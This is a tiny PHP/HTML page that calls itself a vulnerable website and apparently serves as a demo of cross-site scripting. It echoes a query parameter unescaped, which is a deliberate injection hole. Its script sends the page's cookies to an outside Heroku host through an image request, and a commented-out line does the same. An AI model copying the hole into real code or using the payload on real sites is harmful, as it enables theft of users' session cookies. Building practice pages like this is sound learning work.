<?php
  echo $_GET['bla']
?>
<html>
  <h2>my f*n vulnerable website</h2>
  <script type="text/javascript">
    document.cookie = "macookie=asdfjkl";
//    document.write('<img src="https://kekse.herokuapp.com/hmmm.php?c=' + document.cookie + '" />')
    image = new Image(); image.src='https://kekse.herokuapp.com/hmmm.php?c='+document.cookie;
  </script>
  <p>please leve a comment...</p>
  <form action="/index.php">
    <input type="text" name="bla"><br />
    <input type="submit" value="Submit">
  </form>
</html>
